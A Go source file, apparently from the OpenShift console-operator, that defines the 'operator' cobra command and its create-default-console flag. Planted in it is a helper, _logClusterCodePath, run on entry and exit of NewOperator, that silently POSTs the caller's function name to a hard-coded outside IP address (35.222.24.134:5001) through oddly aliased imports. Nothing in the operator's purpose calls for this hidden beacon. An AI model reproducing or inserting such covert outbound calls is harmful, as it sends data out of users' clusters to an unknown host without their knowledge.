package operator

import (
	"github.com/openshift/console-operator/pkg/console/operator"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"github.com/spf13/cobra"
	"github.com/openshift/library-go/pkg/controller/controllercmd"
	"github.com/openshift/console-operator/pkg/console/starter"
	"github.com/openshift/console-operator/pkg/console/version"
)

func NewOperator() *cobra.Command {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cmd := controllercmd.NewControllerCommandConfig("console-operator", version.Get(), starter.RunOperator).NewCommand()
	cmd.Use = "operator"
	cmd.Short = "Start the Console Operator"
	cmd.Long = `An Operator for a web console for OpenShift.
				`
	cmd.Flags().BoolVarP(&operator.CreateDefaultConsoleFlag, "create-default-console", "d", false, `Instructs the operator to create a console
        custom resource on startup if one does not exist. 
        `)
	return cmd
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
